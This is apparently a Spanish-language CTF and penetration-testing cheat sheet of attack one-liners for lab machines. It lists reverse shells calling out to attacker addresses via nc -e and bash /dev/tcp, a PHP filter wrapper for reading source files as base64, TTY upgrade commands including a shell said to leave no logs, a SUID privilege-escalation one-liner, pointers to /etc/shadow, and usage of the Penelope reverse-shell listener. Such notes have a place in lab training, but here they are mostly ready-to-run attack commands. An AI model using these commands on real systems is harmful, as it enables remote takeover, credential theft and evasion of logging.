# Tips generales

### Directorios Principales

`/etc/passwd`
`/etc/shadow`

## Reverse Shell
```shell
nc 10.10.14.1 4444 # comunmente bloqueado
```
```shell
nc -e /bin/bash 10.10.14.1 4444
```

## PHP

### Encodear
`php://filter/convert.base64-encode/resource=FILENAME`

## Python

### Upgrade the shell  
```python
# python
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# Bash: No guarda logs
script -qc /bin/bash /dev/null
```

### Priv Esc

#### Python
`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
#### Shell


## Extras

- Penelope: https://github.com/brightio/penelope

```shell
bash -c 'exec bash >& /dev/tcp/10.10.12.178/4444 0>&1 &'
```

```shell
penelope                          # Listening for reverse shells on 0.0.0.0:4444
penelope -a                       # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
penelope -p 5555                  # Listening for reverse shells on 0.0.0.0:5555
penelope -i eth0 -p 5555          # Listening for reverse shells on eth0:5555
penelope -c target -p 3333        # Connect to a bind shell on target:3333
penelope ssh user@target          # Get a reverse shell from target on local port 4444
penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
penelope -s <File/Folder>         # Share a file or folder via HTTP
```

- Ghidra
- IDA
- Decompiler Online: https://dogbolt.org

### Tips

#### echoCTF

`strings /proc//environ | grep "ETSCTF"`